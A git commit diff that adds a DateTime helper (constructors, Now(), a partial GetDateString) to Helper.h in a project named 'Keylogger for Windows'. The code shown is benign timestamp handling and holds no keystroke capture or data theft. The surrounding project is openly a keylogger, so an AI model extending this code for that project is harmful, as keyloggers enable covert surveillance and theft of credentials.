950d6a4b845dac5c2978ed51dfce5f3ba0d92136
Ishantha Udara <ishanthaudara96@gmail.com>
2020-10-28 21:33:12 +0530

    helper update with time

--- Keylogger for Windows/Helper.h
+++ Keylogger for Windows/Helper.h
@@ -16,7 +16,31 @@ namespace Helper {
 		DateTime() {
 			time_t ms;
 			time(&ms);
+
+			struct tm* info = localtime(&ms);
+
+			D = info->tm_mday;
+			m = info->tm_mon + 1;
+			y = 1900 + info->tm_year;
+			M = info->tm_min;
+			H = info->tm_hour;
+			S = info->tm_sec;
 		}
+
+		DateTime(int D, int m, int y, int H, int M, int S) : D(D), m(m), y(y), H(H), M(M), S(S) {}
+		DateTime(int D, int m, int y) : D(D), m(m), y(y), H(0), M(0), S(0) {}
+
+		DateTime Now() const {
+			return DateTime();
+		}
+
+		int D, m, y, H, M, S;
+
+		std::string GetDateString() const {
+			return std::string( D < 10 ? "0" : "") + ToString(D);
+				   
+		}
+
 	};
 }
 
